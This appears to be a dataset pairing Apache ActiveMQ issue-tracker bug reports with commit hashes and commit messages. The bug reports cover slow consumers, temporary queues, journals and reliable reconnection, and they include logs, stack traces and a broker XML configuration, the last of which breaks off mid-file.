'java ConsumerTool multicast://224.1.2.3:200 true subject false 100 4321 false'
'java ProducerTool multicast://224.1.2.3:200 true subject false 100 1234 false'
(replace that by your favorite Ant or Maven command)

Here is a sample of what you get in the Consumer console. As you can see it is a mix of messages.

     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 2 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 2 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 2 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 2 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 3 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 2 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 3 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 2 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 4 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 3 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 1 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 0 sent at: Sat Jun 25 11:47:01 CEST 2005 ...
     [java] Received: Message: 2 sent at: Sat Jun 25 11:47:02 CEST 2005 ...
     [java] Received: Message: 4 sent at: Sat Jun 25 11:47:02 CEST 2005 ...",370d56e300baf17606af93a27f4a2fbb4c6c3335,"https://issues.apache.org/activemq/browse/AMQ-2770 - durable subscription mbean

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@954893 13f79535-47bb-0310-9956-ffa450edef68"
12481609,AMQ-275,"Relaited to slow consumer condition.

WARN 2005-06-22 12:55:44,135 - Queue is full, waiting for it to be dequeued.


2005-06-22 11:51:09,678 [ocalport=61616]] WARN  BrokerClientImpl               - Connection: ID:ny-cap-33-2024-1119453996333-6:0 is a slow consumer
2005-06-22 11:51:09,678 [ocalport=61616]] WARN  BrokerClientImpl               - Connection: ID:ny-cap-33-2024-1119453996333-6:0 is a slow consumer
2005-06-22 11:51:09,694 [ocalport=61616]] INFO  DataContainer                  - making directory for temporary spooled data: ActiveMQTemp
2005-06-22 11:51:11,069 [ocalport=61616]] WARN  BrokerClientImpl               - Connection: ID:ny-cap-33-2005-1119453893347-6:0 is a slow consumer
2005-06-22 11:51:11,069 [ocalport=61616]] WARN  BrokerClientImpl               - Connection: ID:ny-cap-33-2005-1119453893347-6:0 is a slow consumer

2005-06-22 11:51:17,288 [ocalport=61616]] DEBUG ientTopicBoundedMessageManager - Adding consumer: CONSUMER_INFO: id = 336 ConsumerInfo{ browser = false, destination = ActiveMQ.Advisory.TempDestinations.temp-queue.TemporaryQueue-{TD{ID:ny-cap-33-2150-1119455437835-16:0}TD}ID:ny-cap-33-2150-1119455437835-23:0, consumerIdentifier = 'ID:ny-cap-33-2024-1119453996333-16:0.27.53' , clientId = 'ID:ny-cap-33-2024-1119453996333-16:0' , sessionId = '27' , consumerName = '' , selector = '' , startTime = 1119455477008, started = true, consumerNo = 53, noLocal = false, prefetchNumber = 1000, consumerKey = '[ID:ny-cap-33-2024-1119453996333-16:0:]'  }
2005-06-22 11:51:54,773 [ocalport=61616]] ERROR BrokerClientImpl               - Could not enqueue message ACTIVEMQ_OBJECT_MESSAGE: id = 0 ActiveMQMessage{ , jmsMessageID = ID:ny-cap-33-2005-1119453893347-68:121589, bodyAsBytes = org.activemq.io.util.ByteArray@1f07377, readOnlyMessage = false, jmsClientID = 'ID:ny-cap-33-2005-1119453893347-6:0' , jmsCorrelationID = 'null' , jmsDestination = Topic.sds.PropertyTemplatePublisher, jmsReplyTo = null, jmsDeliveryMode = 2, jmsRedelivered = false, jmsType = 'null' , jmsExpiration = 1119455573508, jmsPriority = 4, jmsTimestamp = 1119455513508, properties = null, readOnlyProperties = false, entryBrokerName = 'ID:nyotc023-2882-1119382254093-0:0' , entryClusterName = 'default' , consumerNos = [I@12cb4ae, transactionId = 'null' , xaTransacted = false, consumerIdentifer = 'null' , messageConsumed = false, transientConsumed = false, sequenceNumber = 121589, deliveryCount = 1, dispatchedFromDLQ = false, messageAcknowledge = null, jmsMessageIdentity = null, producerKey = ID:ny-cap-33-2005-1119453893347-68: } ActiveMQObjectMessage{ object = null } to SpooledBoundedQueue for this slow consumer
javax.jms.JMSException: enqueNoBlock failed: Too many open files
	at org.activemq.io.util.SpooledBoundedActiveMQMessageQueue.enqueueNoBlock(SpooledBoundedActiveMQMessageQueue.java:121)
	at org.activemq.io.util.SpooledBoundedActiveMQMessageQueue.enqueue(SpooledBoundedActiveMQMessageQueue.java:91)
	at org.activemq.broker.impl.BrokerClientImpl.dispatch(BrokerClientImpl.java:198)
	at org.activemq.service.boundedvm.TransientTopicBoundedMessageContainer.dispatchToQueue(TransientTopicBoundedMessageContainer.java:223)
	at org.activemq.service.boundedvm.TransientTopicBoundedMessageContainer.targetAndDispatch(TransientTopicBoundedMessageContainer.java:155)
	at org.activemq.service.boundedvm.TransientTopicBoundedMessageManager.doSendMessage(TransientTopicBoundedMessageManager.java:225)
	at org.activemq.service.boundedvm.TransientTopicBoundedMessageManager.sendMessage(TransientTopicBoundedMessageManager.java:204)
	at org.activemq.broker.impl.DefaultBroker.doMessageSend(DefaultBroker.java:563)
	at org.activemq.broker.impl.DefaultBroker.sendMessage(DefaultBroker.java:305)
	at org.activemq.broker.impl.BrokerContainerImpl.sendMessage(BrokerContainerImpl.java:462)
	at org.activemq.broker.impl.BrokerConnectorImpl.sendMessage(BrokerConnectorImpl.java:271)
	at org.activemq.broker.impl.BrokerClientImpl.consumeActiveMQMessage(BrokerClientImpl.java:706)
	at org.activemq.broker.impl.BrokerClientImpl.consume(BrokerClientImpl.java:310)
	at org.activemq.transport.TransportChannelSupport.doConsumePacket(TransportChannelSupport.java:374)
	at org.activemq.transport.TransportChannelSupport.doConsumePacket(TransportChannelSupport.java:368)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:311)
	at java.lang.Thread.run(Thread.java:534)

",18adfefabef7fb6dc7dafcdf86cb59b54b7750a1,"resolve https://issues.apache.org/activemq/browse/AMQ-2751 - duplicate suppression over eager with listener, session.recover from a message listener when default delayed redelivery is in place

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@948463 13f79535-47bb-0310-9956-ffa450edef68"
12481609,AMQ-275,"Relaited to slow consumer condition.

WARN 2005-06-22 12:55:44,135 - Queue is full, waiting for it to be dequeued.


2005-06-22 11:51:09,678 [ocalport=61616]] WARN  BrokerClientImpl               - Connection: ID:ny-cap-33-2024-1119453996333-6:0 is a slow consumer
2005-06-22 11:51:09,678 [ocalport=61616]] WARN  BrokerClientImpl               - Connection: ID:ny-cap-33-2024-1119453996333-6:0 is a slow consumer
2005-06-22 11:51:09,694 [ocalport=61616]] INFO  DataContainer                  - making directory for temporary spooled data: ActiveMQTemp
2005-06-22 11:51:11,069 [ocalport=61616]] WARN  BrokerClientImpl               - Connection: ID:ny-cap-33-2005-1119453893347-6:0 is a slow consumer
2005-06-22 11:51:11,069 [ocalport=61616]] WARN  BrokerClientImpl               - Connection: ID:ny-cap-33-2005-1119453893347-6:0 is a slow consumer

2005-06-22 11:51:17,288 [ocalport=61616]] DEBUG ientTopicBoundedMessageManager - Adding consumer: CONSUMER_INFO: id = 336 ConsumerInfo{ browser = false, destination = ActiveMQ.Advisory.TempDestinations.temp-queue.TemporaryQueue-{TD{ID:ny-cap-33-2150-1119455437835-16:0}TD}ID:ny-cap-33-2150-1119455437835-23:0, consumerIdentifier = 'ID:ny-cap-33-2024-1119453996333-16:0.27.53' , clientId = 'ID:ny-cap-33-2024-1119453996333-16:0' , sessionId = '27' , consumerName = '' , selector = '' , startTime = 1119455477008, started = true, consumerNo = 53, noLocal = false, prefetchNumber = 1000, consumerKey = '[ID:ny-cap-33-2024-1119453996333-16:0:]'  }
2005-06-22 11:51:54,773 [ocalport=61616]] ERROR BrokerClientImpl               - Could not enqueue message ACTIVEMQ_OBJECT_MESSAGE: id = 0 ActiveMQMessage{ , jmsMessageID = ID:ny-cap-33-2005-1119453893347-68:121589, bodyAsBytes = org.activemq.io.util.ByteArray@1f07377, readOnlyMessage = false, jmsClientID = 'ID:ny-cap-33-2005-1119453893347-6:0' , jmsCorrelationID = 'null' , jmsDestination = Topic.sds.PropertyTemplatePublisher, jmsReplyTo = null, jmsDeliveryMode = 2, jmsRedelivered = false, jmsType = 'null' , jmsExpiration = 1119455573508, jmsPriority = 4, jmsTimestamp = 1119455513508, properties = null, readOnlyProperties = false, entryBrokerName = 'ID:nyotc023-2882-1119382254093-0:0' , entryClusterName = 'default' , consumerNos = [I@12cb4ae, transactionId = 'null' , xaTransacted = false, consumerIdentifer = 'null' , messageConsumed = false, transientConsumed = false, sequenceNumber = 121589, deliveryCount = 1, dispatchedFromDLQ = false, messageAcknowledge = null, jmsMessageIdentity = null, producerKey = ID:ny-cap-33-2005-1119453893347-68: } ActiveMQObjectMessage{ object = null } to SpooledBoundedQueue for this slow consumer
javax.jms.JMSException: enqueNoBlock failed: Too many open files
	at org.activemq.io.util.SpooledBoundedActiveMQMessageQueue.enqueueNoBlock(SpooledBoundedActiveMQMessageQueue.java:121)
	at org.activemq.io.util.SpooledBoundedActiveMQMessageQueue.enqueue(SpooledBoundedActiveMQMessageQueue.java:91)
	at org.activemq.broker.impl.BrokerClientImpl.dispatch(BrokerClientImpl.java:198)
	at org.activemq.service.boundedvm.TransientTopicBoundedMessageContainer.dispatchToQueue(TransientTopicBoundedMessageContainer.java:223)
	at org.activemq.service.boundedvm.TransientTopicBoundedMessageContainer.targetAndDispatch(TransientTopicBoundedMessageContainer.java:155)
	at org.activemq.service.boundedvm.TransientTopicBoundedMessageManager.doSendMessage(TransientTopicBoundedMessageManager.java:225)
	at org.activemq.service.boundedvm.TransientTopicBoundedMessageManager.sendMessage(TransientTopicBoundedMessageManager.java:204)
	at org.activemq.broker.impl.DefaultBroker.doMessageSend(DefaultBroker.java:563)
	at org.activemq.broker.impl.DefaultBroker.sendMessage(DefaultBroker.java:305)
	at org.activemq.broker.impl.BrokerContainerImpl.sendMessage(BrokerContainerImpl.java:462)
	at org.activemq.broker.impl.BrokerConnectorImpl.sendMessage(BrokerConnectorImpl.java:271)
	at org.activemq.broker.impl.BrokerClientImpl.consumeActiveMQMessage(BrokerClientImpl.java:706)
	at org.activemq.broker.impl.BrokerClientImpl.consume(BrokerClientImpl.java:310)
	at org.activemq.transport.TransportChannelSupport.doConsumePacket(TransportChannelSupport.java:374)
	at org.activemq.transport.TransportChannelSupport.doConsumePacket(TransportChannelSupport.java:368)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:311)
	at java.lang.Thread.run(Thread.java:534)

",99ef19a43d47c698ffd2ef2e8c6bff0334c53310,"https://issues.apache.org/activemq/browse/AMQ-2753 - additional test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@951067 13f79535-47bb-0310-9956-ffa450edef68"
12481264,AMQ-273,"See:

http://permalink.gmane.org/gmane.comp.java.activemq.devel/534",a34c80858e17ad8e2b627b33836514ad651a8c6f,"https://issues.apache.org/activemq/browse/AMQ-2732 - ftp blob permission denied

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@943915 13f79535-47bb-0310-9956-ffa450edef68"
12481264,AMQ-273,"See:

http://permalink.gmane.org/gmane.comp.java.activemq.devel/534",3713a3bdeb734b1cd076b08177f44a450e2de43b,"resolve https://issues.apache.org/activemq/browse/AMQ-2737 - add the two new files, oops

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@945709 13f79535-47bb-0310-9956-ffa450edef68"
12481089,AMQ-272,"See:

http://permalink.gmane.org/gmane.comp.java.activemq.devel/534",21b81e180f831724f0969edbfdb03e76cb238551,"https://issues.apache.org/activemq/browse/AMQ-2728 - cleaning up MessageServlet

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@943466 13f79535-47bb-0310-9956-ffa450edef68"
12481089,AMQ-272,"See:

http://permalink.gmane.org/gmane.comp.java.activemq.devel/534",7046dc7f248ac25475615e0023453ea2a9beb0f0,"https://issues.apache.org/activemq/browse/AMQ-2727 - patch applied with thanks

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@945033 13f79535-47bb-0310-9956-ffa450edef68"
12481298,AMQ-267,It's possible that due to weird network conditions a client using reliable may restart multiple connections and they will call the registerConnection method of BrokerContainerImpl concurrently.,aef23f94f35c180fc4165d9335f0a579253bb3e8,"resolve https://issues.apache.org/activemq/browse/AMQ-2670 - apply patch with thanks. Now possible to integrate RAR XAResource with jboss via the jboss org.jboss.jms.server.recovery.MessagingXAResourceRecovery handler

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@927520 13f79535-47bb-0310-9956-ffa450edef68"
12481361,AMQ-263,"I tried to test ActiveMQ peer-to-peer in JMeter with the producer and consumer in the same VM (embedded broker, ""peer://development"" as url). 
I got the following exception:

javax.jms.JMSException: Failed to open transaction journal: java.io.IOException: Journal is allready opened by another application 

The producer and consumer were both trying to modify the same journal for persistence (in directory ""ActiveMQ"" or value set to system property ""activemq.store.dir"")",f33e2190d0c481b78171749091d3d044f139e85d,"resolve https://issues.apache.org/activemq/browse/AMQ-2630 - added test and restricted imlementation

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@918381 13f79535-47bb-0310-9956-ffa450edef68"
12481341,AMQ-262,"I have been testing version 266 and found that request/reply test is not working at a 100% level across networked brokers.  At first I thought that the race condition that had been a prior release had be revived. This was where replier would try to use the temp destination before the bridge was established.  Before that was fixed I could just insert a delay after creating the temp destination and its use to get around the problem.  Now it seems that work-around does not work either.  The first attempt to send a message to the temp destination will fail.

I have found that repeated attempts will succeed.  It seems that the first failed attempt is trigger a completion of the temp definition setup?  Anyway if after the first request fails to receive the reply, another request is made, the replying process has no problem sending the second reply.

Could this be another problem introduced as a result of the AdvisorySupport changes? ",ff006954d811ccaa84b8f94a77168aaaa7d73898,"add additional test class : https://issues.apache.org/activemq/browse/AMQ-2622

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@927066 13f79535-47bb-0310-9956-ffa450edef68"
12481341,AMQ-262,"I have been testing version 266 and found that request/reply test is not working at a 100% level across networked brokers.  At first I thought that the race condition that had been a prior release had be revived. This was where replier would try to use the temp destination before the bridge was established.  Before that was fixed I could just insert a delay after creating the temp destination and its use to get around the problem.  Now it seems that work-around does not work either.  The first attempt to send a message to the temp destination will fail.

I have found that repeated attempts will succeed.  It seems that the first failed attempt is trigger a completion of the temp definition setup?  Anyway if after the first request fails to receive the reply, another request is made, the replying process has no problem sending the second reply.

Could this be another problem introduced as a result of the AdvisorySupport changes? ",35593638f5d45f7ba5a76d4431afe725563f633e,"resolve ConnectorXBeanConfigTest, broker service needs to null more impls at shutdown to allow restart to find new impls of scheudaler etc. consequence of fixes for https://issues.apache.org/activemq/browse/AMQ-2620  and
https://issues.apache.org/activemq/browse/AMQ-2568

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@947671 13f79535-47bb-0310-9956-ffa450edef68"
12481295,AMQ-261,Cook reported that we have broker the wire Format.,0771df3b725b055f4f475c44eaa80928b0f45d41,"https://issues.apache.org/activemq/browse/AMQ-2617 - initial ws transport implementation

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@911492 13f79535-47bb-0310-9956-ffa450edef68"
12481230,AMQ-258,<NA>,815c2f32bce321aeaa94f0d2a5a1fa0137814562,"resolve https://issues.apache.org/activemq/browse/AMQ-2584 for kahaDB, AMQ store still needs work, seems to be a different issue

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@986651 13f79535-47bb-0310-9956-ffa450edef68"
12481230,AMQ-258,<NA>,c290a17460fb61ba97a71e149cb9da2ad80cc0f9,"add test variant that demonstrates the need to disable the audit on the dlq when there is a concurrent consumer with multiple durable subs, some duplicate sends will not be caught (if they are acked in the mean time) so that audit stop needs to be disabled such that they can be consumed. This points to the need for a dlq per durable sub. work around for: https://issues.apache.org/activemq/browse/AMQ-2584

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1027886 13f79535-47bb-0310-9956-ffa450edef68"
12481119,AMQ-256,"Error occurs when using the RA with JBoss and you get error message:
java.lang.IllegalStateException: Multiple message delivery between before and after delivery is not allowed
",9cf216cce13299c81ddc805306b0ffaf3b096214,"resolve intermittent ZeroPrefetchConsumerTest failure - prefetch excension decrement needs to be conditional on prefecth=0, relates to changes to prefetchExtension for https://issues.apache.org/activemq/browse/AMQ-2560

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@898281 13f79535-47bb-0310-9956-ffa450edef68"
12481119,AMQ-256,"Error occurs when using the RA with JBoss and you get error message:
java.lang.IllegalStateException: Multiple message delivery between before and after delivery is not allowed
",e300b8768c881ab5ddef03a4d710e48176de1a5a,"Added test case for https://issues.apache.org/activemq/browse/AMQ-2561

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@899205 13f79535-47bb-0310-9956-ffa450edef68"
12481119,AMQ-256,"Error occurs when using the RA with JBoss and you get error message:
java.lang.IllegalStateException: Multiple message delivery between before and after delivery is not allowed
",d4794e2420f373c90a295791712ac225953ed0b4,"AMQ-2569 Updated the spring.schemas file in activemq-core with the released activemq-core version

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@899542 13f79535-47bb-0310-9956-ffa450edef68"
12481119,AMQ-256,"Error occurs when using the RA with JBoss and you get error message:
java.lang.IllegalStateException: Multiple message delivery between before and after delivery is not allowed
",630184adfa669df839aa627ef4631453be2be35d,"test case for https://issues.apache.org/activemq/browse/AMQ-2568

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@899640 13f79535-47bb-0310-9956-ffa450edef68"
12481119,AMQ-256,"Error occurs when using the RA with JBoss and you get error message:
java.lang.IllegalStateException: Multiple message delivery between before and after delivery is not allowed
",35593638f5d45f7ba5a76d4431afe725563f633e,"resolve ConnectorXBeanConfigTest, broker service needs to null more impls at shutdown to allow restart to find new impls of scheudaler etc. consequence of fixes for https://issues.apache.org/activemq/browse/AMQ-2620  and
https://issues.apache.org/activemq/browse/AMQ-2568

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@947671 13f79535-47bb-0310-9956-ffa450edef68"
12481287,AMQ-254,<NA>,1035ac3417d7245f4e9c321714315478aa08e158,"add spring-jms dependency to resolve cnf post https://issues.apache.org/activemq/browse/AMQ-2547 - upgrading trunk to spring 3.0.1.RELEASE

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@917645 13f79535-47bb-0310-9956-ffa450edef68"
12481149,AMQ-245,"Error was occuring when using durable subscriptions, transactions and the journal when the journal checkpointed.
",d3ec081fc62524efc96183af0336e1209c604dc4,"Applied patch for https://issues.apache.org/activemq/browse/AMQ-2454

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@825457 13f79535-47bb-0310-9956-ffa450edef68"
12481149,AMQ-245,"Error was occuring when using durable subscriptions, transactions and the journal when the journal checkpointed.
",0d05af661405f9f765182c7570ddf6a518870f6b,"https://issues.apache.org/activemq/browse/AMQ-2456 - JaasDualAuthentcationPlugin/Broker

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@945227 13f79535-47bb-0310-9956-ffa450edef68"
12481149,AMQ-245,"Error was occuring when using durable subscriptions, transactions and the journal when the journal checkpointed.
",e0776ff0208d8570351202ab15baada0eba014b2,"Fix for: https://issues.apache.org/jira/browse/AMQ-2453

Add an LSB header to the init scripts 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1368455 13f79535-47bb-0310-9956-ffa450edef68"
12481325,AMQ-239,"The ssl file in the META-INF directory doesn't exist in the 3.0 binary release jar file.  Simple example that uses SSL barfs:

javax.jms.JMSException: Could not load protocol: ssl. Reason: java.io.IOException: Could not find class for resource: META-INF/services/org/activemq/transport/server/ssl
	at org.activemq.transport.TransportServerChannelProvider.createJMSexception(TransportServerChannelProvider.java:85)
	at org.activemq.transport.TransportServerChannelProvider.getFactory(TransportServerChannelProvider.java:76)
	at org.activemq.transport.TransportServerChannelProvider.create(TransportServerChannelProvider.java:45)
	at org.activemq.broker.impl.BrokerConnectorImpl.createTransportServerChannel(BrokerConnectorImpl.java:415)
	at org.activemq.broker.impl.BrokerConnectorImpl.<init>(BrokerConnectorImpl.java:69)
	at org.activemq.broker.impl.BrokerContainerImpl.addConnector(BrokerContainerImpl.java:616)
	at org.activemq.broker.impl.BrokerContainerImpl.addConnector(BrokerContainerImpl.java:612)

",bdd989a975493d79a90623c2d06b5d6a5e40c0d3,"https://issues.apache.org/activemq/browse/AMQ-2390 - removing unused heavyweight dependencies from camel webapp

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@814696 13f79535-47bb-0310-9956-ffa450edef68"
12481325,AMQ-239,"The ssl file in the META-INF directory doesn't exist in the 3.0 binary release jar file.  Simple example that uses SSL barfs:

javax.jms.JMSException: Could not load protocol: ssl. Reason: java.io.IOException: Could not find class for resource: META-INF/services/org/activemq/transport/server/ssl
	at org.activemq.transport.TransportServerChannelProvider.createJMSexception(TransportServerChannelProvider.java:85)
	at org.activemq.transport.TransportServerChannelProvider.getFactory(TransportServerChannelProvider.java:76)
	at org.activemq.transport.TransportServerChannelProvider.create(TransportServerChannelProvider.java:45)
	at org.activemq.broker.impl.BrokerConnectorImpl.createTransportServerChannel(BrokerConnectorImpl.java:415)
	at org.activemq.broker.impl.BrokerConnectorImpl.<init>(BrokerConnectorImpl.java:69)
	at org.activemq.broker.impl.BrokerContainerImpl.addConnector(BrokerContainerImpl.java:616)
	at org.activemq.broker.impl.BrokerContainerImpl.addConnector(BrokerContainerImpl.java:612)

",da6809ced39e304728aebeec3561fed644ec7568,"https://issues.apache.org/activemq/browse/AMQ-2393 - add repositories for jsr311-api

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@815661 13f79535-47bb-0310-9956-ffa450edef68"
12481068,AMQ-238,"We are using a Requestor for JMS RPC using a temporary queue.

We have a small number of clients, but each client potentially makes thousands of requests, and each request creates its own temporary queue.

We were seeing memory growth in 2.1 related to connections, this seems to be fixed in 3.0.

However, we now see memory growth in a different place.  YourKit shows 70% of the 240mb (currently) memory used, is in o.a.service.boundedvm.TransientQueueBoundedMessageManager.destinationMap (1 million objects), there are around 10,000 objects in TransientQueueBoundedMessageManager.destinations and TransientQueueBoundedMessageManager.containers.

We are opening and closing a connection for each Requestor, so the temporary queue, should be closing, and there is also a queue.delete() as in o.a.bean.Requestor.

If you want a YourKit snapshot, let me know, and I'll attach one.

We are looking at using a single topic with selectors as a workaround, but that complicates the logic, in order not to miss the response, before you start listening.  i.e. another thread is required.",28443226b67529ed1cef132db8634cd73a981c58,"test case for: https://issues.apache.org/activemq/browse/AMQ-2383 - works on trunk

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@813734 13f79535-47bb-0310-9956-ffa450edef68"
12481068,AMQ-238,"We are using a Requestor for JMS RPC using a temporary queue.

We have a small number of clients, but each client potentially makes thousands of requests, and each request creates its own temporary queue.

We were seeing memory growth in 2.1 related to connections, this seems to be fixed in 3.0.

However, we now see memory growth in a different place.  YourKit shows 70% of the 240mb (currently) memory used, is in o.a.service.boundedvm.TransientQueueBoundedMessageManager.destinationMap (1 million objects), there are around 10,000 objects in TransientQueueBoundedMessageManager.destinations and TransientQueueBoundedMessageManager.containers.

We are opening and closing a connection for each Requestor, so the temporary queue, should be closing, and there is also a queue.delete() as in o.a.bean.Requestor.

If you want a YourKit snapshot, let me know, and I'll attach one.

We are looking at using a single topic with selectors as a workaround, but that complicates the logic, in order not to miss the response, before you start listening.  i.e. another thread is required.",9822d58d04abe22f059b85b418478a4f80592322,"resolve https://issues.apache.org/activemq/browse/AMQ-2384 - not exactly the patch but allowing the introspector to work, which is more generic with some tests, thanks phil for the impetus on this

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@929618 13f79535-47bb-0310-9956-ffa450edef68"
12481068,AMQ-238,"We are using a Requestor for JMS RPC using a temporary queue.

We have a small number of clients, but each client potentially makes thousands of requests, and each request creates its own temporary queue.

We were seeing memory growth in 2.1 related to connections, this seems to be fixed in 3.0.

However, we now see memory growth in a different place.  YourKit shows 70% of the 240mb (currently) memory used, is in o.a.service.boundedvm.TransientQueueBoundedMessageManager.destinationMap (1 million objects), there are around 10,000 objects in TransientQueueBoundedMessageManager.destinations and TransientQueueBoundedMessageManager.containers.

We are opening and closing a connection for each Requestor, so the temporary queue, should be closing, and there is also a queue.delete() as in o.a.bean.Requestor.

If you want a YourKit snapshot, let me know, and I'll attach one.

We are looking at using a single topic with selectors as a workaround, but that complicates the logic, in order not to miss the response, before you start listening.  i.e. another thread is required.",4927c54a0aa6b19995d60b8b5ab840fd8ef6eb1f,AMQ-2388: Enanched log4j logger to include exact versio number.
12481164,AMQ-237,Seems like the spring xslt transform does not cause the adapterClass to get set correctly.,c1051c8ee1b56480fc78d850c2dc55344244523a,"Fix for https://issues.apache.org/activemq/browse/AMQ-2378

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@812139 13f79535-47bb-0310-9956-ffa450edef68"
12481064,AMQ-233,"Right now the tcp transport could send messages out of order if the number of outstanding messages to be delivered exeeds the maxOutstandingMessages amount.

The PooledExecutor being used uses the default blocked execution policy which is Run.  It should be changed to Wait so that messages are not sent out of order.

Increasing the maxOutstandingMessages to a high number reduces the chance that the problem will be encountered.",d779c4aecd9be0ad8ae7c896ff8a18b9a72eec46,"Applied patch for https://issues.apache.org/activemq/browse/AMQ-2339

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@800274 13f79535-47bb-0310-9956-ffa450edef68"
12481064,AMQ-233,"Right now the tcp transport could send messages out of order if the number of outstanding messages to be delivered exeeds the maxOutstandingMessages amount.

The PooledExecutor being used uses the default blocked execution policy which is Run.  It should be changed to Wait so that messages are not sent out of order.

Increasing the maxOutstandingMessages to a high number reduces the chance that the problem will be encountered.",1d4d0e46790835a7d050d3769a346ccb2583126d,"expose new options -  https://issues.apache.org/activemq/browse/AMQ-2338

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@802109 13f79535-47bb-0310-9956-ffa450edef68"
12481066,AMQ-230,"This will either prove to be an incorrect assumption on my part, or a bug.  

Normally the reliable protocol is used to fail-over to a different broker if the 1st connected to broker dies.  However if one sets up a client connection using the reliable protocol to a one-and-only external/standalone broker that is alive, then dead, then alive, the reliable protocol does not reconnect to it.

This issue may be directly related to AMQ-211 which is marked as fixed, but this test case still fails for me.

The really interesting part is line 105 of my test case, that tries to send the 2nd message.  This line actually succeeds, but NOTHING actually happens.  By tracing through, I eventually get to ActiveMQSession, line 1458, where it calls asyncSendPacket(msg). Inside this method, it checks the isTransportOK property (which is false at this point), then does NOTHING, and returns.  

It is a silent failure.

Steps to Reproduce:

1. Using the 20050407 3.0 snapshot distribution, startup a standalone broker process using the below configuration file:

<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE beans PUBLIC  ""-//ACTIVEMQ//DTD//EN"" ""http://activemq.org/dtd/activemq.dtd"">
<beans>

  <broker>
    <connector>
      <tcpServerTransport uri=""tcp://localhost:61616""/>
    </connector>
<!--
    <discoveryAgent>
      <zeroconfDiscovery type=""_activemq.broker.development.""/>
    </discoveryAgent>

    <discoveryNetworkConnector/>
-->

    <persistence>
      <cachePersistence>
        <journalPersistence directory=""../var/journal"">
          <jdbcPersistence dataSourceRef=""derby-ds""/>
        </journalPersistence>
      </cachePersistence>
    </persistence>
  </broker>

  <!-- ==================================================================== -->
  <!-- JDBC DataSource Configurations -->
  <!-- ==================================================================== -->

  <!-- The Derby Datasource that will be used by the Broker -->
  <bean id=""derby-ds"" class=""org.apache.commons.dbcp.BasicDataSource"" destroy-method=""close"">
    <property name=""driverClassName"">
      <value>org.apache.derby.jdbc.EmbeddedDriver</value>
    </property>
